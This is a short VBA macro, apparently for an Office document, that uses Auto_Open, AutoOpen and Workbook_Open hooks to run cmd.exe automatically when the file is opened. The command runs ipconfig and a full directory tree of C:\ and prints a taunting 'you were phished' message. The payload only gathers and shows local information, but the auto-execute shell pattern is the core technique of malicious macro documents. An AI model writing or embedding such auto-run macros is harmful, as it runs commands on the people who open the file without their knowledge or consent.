

  Sub Auto_Open()
  Shell "C:\windows\System32\cmd.exe /k ipconfig && tree C:\ && echo ahahahaha, you were phished, too bad I hid my pseudo-code so you can't find where I am", vbMaximizedFocus
End Sub

Sub AutoOpen()
  Auto_Open
End Sub

Sub Workbook_Open()
  Auto_Open
End Sub
